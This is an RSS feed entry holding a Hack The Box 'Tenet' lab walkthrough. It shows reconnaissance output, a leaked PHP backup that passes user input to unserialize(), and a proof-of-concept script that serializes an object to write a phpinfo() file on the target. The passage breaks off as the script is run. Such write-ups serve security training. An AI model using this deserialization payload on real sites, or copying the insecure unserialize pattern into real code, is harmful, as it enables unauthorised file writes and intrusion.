<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Race-condition on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/race-condition/</link>
    <description>Recent content in Race-condition on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 14 Jun 2021 21:46:38 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/race-condition/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Tenet</title>
      <link>https://fahmifj.github.io/hackthebox/tenet/</link>
      <pubDate>Mon, 14 Jun 2021 21:46:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/tenet/</guid>
      <description>Friendly PHP insecure deserialization attack and race condition</description>
      <content:encoded><![CDATA[<p>Tenet from Hack The Box hosts a Website that is vulnerable to PHP deserialization, and this can be exploited for initial access. Enumerating inside the system reveals a set of database credentials, and these are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>PHP deserialization attack</li>
<li>Race-condition</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>PHP</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan on Tenet discovers two open ports: SSH on port 22 and an Apache web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 10.10.10.223 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -p<span class="nv">$ports</span> -oA scans/full-tenet 10.10.10.223
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.80 scan initiated Tue Mar 16 23:32:46 2021 as: nmap -sC -sV -p22,80 -oA scans/full-tenet 10.10.10.223</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.223
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.059s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Scanned at 2021-03-16 23:32:46 EDT <span class="k">for</span> 17s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo<span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Tue Mar 16 23:33:03 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds</span>
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p><code>nmap</code> already identified that this site is the default page of Apache web server.</p>
<p><div class="img-container"><img src="imgs/image-20210614165913959.png" alt="image-20210614165913959"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p>Running <code>gobuster</code> against the site reveals that there is a WordPress site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/common.txt -b 404,403 -x txt,php,bak -o gobuster/gobuster-nohostname
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.223/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   403,404
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php,bak
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/06/14 06:08:53 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10918<span class="o">]</span>
</span></span><span class="line"><span class="cl">/users.txt            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7<span class="o">]</span>    
</span></span><span class="line"><span class="cl">/wordpress            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.223/wordpress/<span class="o">]</span>
</span></span><span class="line"><span class="cl">                                                                                    
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/06/14 06:11:20 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><p>Poking <code>/users.txt</code> returns a &ldquo;Success&rdquo; message.</p>
<p><div class="img-container"><img src="imgs/image-20210614171354046.png" alt="image-20210614171354046"  /></div>
</p>
<h4 id="wordpress">/wordpress</h4>
<p>On  <code>/wordpress</code>, somehow  the site looks broken.</p>
<p><div class="img-container"><img src="imgs/image-20210614171926106.png" alt="image-20210614171926106"  /></div>
</p>
<p>It turns out there is a hostname.</p>
<p><div class="img-container"><img src="imgs/image-20210614172030551.png" alt="image-20210614172030551"  /></div>
</p>
<p>I&rsquo;ll add <code>tenet.htb</code> to my <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;tenet.htb 10.10.10.223&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Poking the site with <code>curl</code> shows that this port has a slightly different contents when it visited using a hostname.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.223 <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">10918</span>
</span></span><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ curl -s http://tenet.htb <span class="p">|</span> wc -c 
</span></span><span class="line"><span class="cl"><span class="m">10581</span>
</span></span></code></pre></div><h3 id="tcp-80---tenethtb">TCP 80 - tenet.htb</h3>
<p>On <code>tenet.htb</code>, there are some blog posts.</p>
<p><div class="img-container"><img src="imgs/image-20210614173225299.png" alt="image-20210614173225299"  /></div>
</p>
<p>One of the post titled with &ldquo;Migrations&rdquo; states that they&rsquo;re currently migrating the data from a flat file.</p>
<blockquote>
<p>/etc/passwd and /etc/shadow are the examples of what is known as a flat file structure.</p>
</blockquote>
<p><div class="img-container"><img src="imgs/image-20210614173704577.png" alt="image-20210614173704577"  /></div>
</p>
<p>At the bottom, there is a comment by a user named <code>neil</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210614174052879.png" alt="image-20210614174052879"  /></div>
</p>
<p>The user was asking about a PHP file called sator and its backup file. I&rsquo;ll note this.</p>
<h4 id="wpscan">WPScan</h4>
<p>I ran a <code>wpscan</code>  to find some database backup or something related with that, but I didn&rsquo;t find anything except usernames.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ wpscan --url http://tenet.htb/ -e vp,vt,cb,dbe,u1-15                                                          
</span></span><span class="line"><span class="cl">_______________________________________________________________
</span></span><span class="line"><span class="cl">         __          _______   _____
</span></span><span class="line"><span class="cl">         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
</span></span><span class="line"><span class="cl">          <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ ®
</span></span><span class="line"><span class="cl">           <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>            <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">             <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">         WordPress Security Scanner by the WPScan Team
</span></span><span class="line"><span class="cl">                         Version 3.8.17
</span></span><span class="line"><span class="cl">       Sponsored by Automattic - https://automattic.com/
</span></span><span class="line"><span class="cl">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
</span></span><span class="line"><span class="cl">_______________________________________________________________
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> protagonist
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By:
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>   - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> neil
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</span></span></code></pre></div><h4 id="directory-brute-force-guessing">Directory brute-force (Guessing)</h4>
<p>I tried to guess the location of sator php files with <code>curl</code> but nothing there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in sator.php sator.php.bak<span class="p">;</span> <span class="k">do</span> curl -sIL http://tenet.htb/<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">404</span> Not Found
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 10:51:50 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">404</span> Not Found
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 10:51:51 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
</span></span></code></pre></div><h3 id="vhost-enumeration">Vhost Enumeration</h3>
<p>Next, I&rsquo;ll try to enumerate vhost, but first I&rsquo;ll use <code>cewl</code> to generate a custom wordlist. Because &ldquo;sator&rdquo; and &ldquo;backup&rdquo; are consists of 5 characters, I&rsquo;ll set the minimum word length to 5.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ cewl -m <span class="m">5</span> -w wordlist-vhost http://tenet.htb
</span></span><span class="line"><span class="cl">CeWL 5.4.6 <span class="o">(</span>Exclusion<span class="o">)</span> Robin Wood <span class="o">(</span>robin@digi.ninja<span class="o">)</span> <span class="o">(</span>https://digi.ninja/<span class="o">)</span>
</span></span></code></pre></div><p>I tried the wordlist with <code>ffuf</code>, but didn&rsquo;t find any (damn this tool is insanely fast, took 5 sec).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ ffuf -w wordlist-vhost -u http://10.10.10.223 -H <span class="s2">&#34;Host: FUZZ.tenet.htb&#34;</span> -mc <span class="m">200</span> -fl <span class="m">376</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v1.3.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : http://10.10.10.223
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: wordlist-vhost
</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.tenet.htb
</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
</span></span><span class="line"><span class="cl"> :: Filter           : Response lines: <span class="m">376</span>
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>93/93<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">11</span> req/sec :: Duration: <span class="o">[</span>0:00:05<span class="o">]</span> :: Errors: <span class="m">0</span> ::
</span></span></code></pre></div><h3 id="apache-default-page-revisit">Apache Default Page (Revisit)</h3>
<p>The files that user Neil talking about was found at  <code>http://10.10.10.223/[here]</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in sator.php sator.php.bak<span class="p">;</span> <span class="k">do</span> curl -sIL http://10.10.10.223/<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 11:21:04 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 11:21:05 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Last-Modified: Thu, <span class="m">17</span> Dec <span class="m">2020</span> 09:52:50 GMT
</span></span><span class="line"><span class="cl">ETag: <span class="s2">&#34;202-5b6a5f47911e4&#34;</span>
</span></span><span class="line"><span class="cl">Accept-Ranges: bytes
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">514</span>
</span></span><span class="line"><span class="cl">Content-Type: application/x-trash
</span></span></code></pre></div><p>Another guessing, here the keyword is &ldquo;Migration&rdquo;, so I think that before they moving into <code>/wordpress/</code>, the site was previously hosted at  <code>/</code> (the root).</p>
<p>Poking <code>Sator.php</code> results the following contents:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.223/sator.php
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Grabbing users from text file &lt;br&gt;
</span></span><span class="line"><span class="cl"><span class="o">[]</span> Database updated &lt;br&gt;
</span></span></code></pre></div><p>Poking <code>sator.php.bak</code> returns PHP codes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.223/sator.php.bak
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">class DatabaseExport
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">        public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">&#39;users.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        public <span class="k">function</span> update_db<span class="o">()</span>
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="nb">echo</span> <span class="s1">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span>-&gt; <span class="nv">data</span> <span class="o">=</span> <span class="s1">&#39;Success&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        public <span class="k">function</span> __destruct<span class="o">()</span>
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">                file_put_contents<span class="o">(</span>__DIR__ . <span class="s1">&#39;/&#39;</span> . <span class="nv">$this</span> -&gt;user_file, <span class="nv">$this</span>-&gt;data<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nb">echo</span> <span class="s1">&#39;[] Database updated &lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        //      <span class="nb">echo</span> <span class="s1">&#39;Gotta get this working properly...&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;arepo&#39;</span><span class="o">]</span> ?? <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$databaseupdate</span> <span class="o">=</span> unserialize<span class="o">(</span><span class="nv">$input</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$app</span> <span class="o">=</span> new DatabaseExport<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$app</span> -&gt; update_db<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?&gt;
</span></span></code></pre></div><h3 id="source-code-analysis">Source Code Analysis</h3>
<h4 id="deserialization-vulnerability">Deserialization vulnerability</h4>
<p>From the previous code, <code>sator.php.bak</code> contains a PHP magic function called <code>__destruct()</code>. I&rsquo;m not skilled enough to explain it on detail, but from what I know is that the function will be called when there is no more references to an object (comment by me):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="c1">// __destruct is called afterwards
</span></span></span><span class="line"><span class="cl"><span class="c1">// [] Database updated will be printed out
</span></span></span></code></pre></div><p>Here is an example:</p>
<p><div class="img-container"><img src="imgs/image-20210614190334075.png" alt="image-20210614190334075"  /></div>
</p>
<p>Furthermore, the user-controlled input with parameter <code>arepo</code> is directly passed to <code>unserialize()</code> function. Knowing this, I could send a malicious DatabaseExport object (serialized) by assuming that <code>sator.php</code> uses the same code as <code>sator.php.bak</code>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="insecure-deserialization-attack---poc">Insecure Deserialization attack - PoC</h4>
<p>From the previous code, <code>unserialize</code> is called before the creation of object (<code>$app</code>), so I will use the opposite magic function called <code>__construct()</code>.</p>
<p>I&rsquo;ll do some testing with this script below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DatabaseExport</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">        		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_file</span> <span class="o">=</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>I use URL encode there because I&rsquo;m going to use <code>curl</code> to interact with the site. I will save the script to a file called <code>tenetization.php</code>.</p>
<p>I will run that script and copy the output. If I don&rsquo;t have PHP, I could use <a href="https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler">this site</a> to get output of my PHP script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ php tenetization.php
